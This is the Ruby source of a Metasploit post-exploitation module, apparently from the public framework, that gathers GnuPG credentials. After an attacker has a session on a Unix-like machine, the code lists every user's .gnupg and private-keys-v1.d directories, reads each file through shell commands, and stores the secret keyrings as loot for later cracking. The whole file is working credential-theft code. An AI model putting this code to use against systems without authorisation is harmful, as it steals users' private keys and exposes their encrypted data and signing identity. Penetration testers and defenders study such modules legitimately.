##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather GnuPG Credentials Collection',
      'Description'    => %q{
          This module will collect the contents of all users' .gnupg directories on the targeted
        machine. Password protected secret keyrings can be cracked with John the Ripper (JtR).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Dhiru Kholia <dhiru[at]openwall.com>', # Original author
          'Henry Hoggard' # Add GPG 2.1 keys, stop writing empty files
        ],
      'Platform'       => %w{ bsd linux osx unix },
      'SessionTypes'   => ['shell', 'meterpreter']
    ))
  end

  # This module is largely based on ssh_creds and firefox_creds.rb.

  def run
    paths = []
    print_status('Finding GnuPG directories')
    dirs = enum_user_directories
    sub_dirs = ['private-keys-v1.d']

    dirs.each do |dir|
      gnupg_dir = "#{dir}/.gnupg"
      next unless directory?(gnupg_dir)
      paths << gnupg_dir

      sub_dirs.each do |sub_dir|
        paths << "#{gnupg_dir}/#{sub_dir}" if directory?("#{gnupg_dir}/#{sub_dir}")
      end
    end

    if paths.nil? || paths.empty?
      print_error('No users found with a GnuPG directory')
      return
    end

    download_loot(paths)
  end

  def download_loot(paths)
    print_status("Looting #{paths.count} directories")
    paths.each do |path|
      path.chomp!
      sep = "/"
      files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)

      files.each do |file|
        target = "#{path}#{sep}#{file}"
        if directory?(target)
          next
        end
        print_status("Downloading #{target} -> #{file}")
        data = read_file(target)
        file = file.split(sep).last
        type = file.gsub(/\.gpg.*/, "").gsub(/gpg\./, "")
        if data.to_s.empty?
          vprint_error("No data found for #{file}")
        else
          loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
            "gpg_#{file}", "GnuPG #{file} File")
          print_good("File stored in: #{loot_path.to_s}")
        end
      end

    end
  end
end
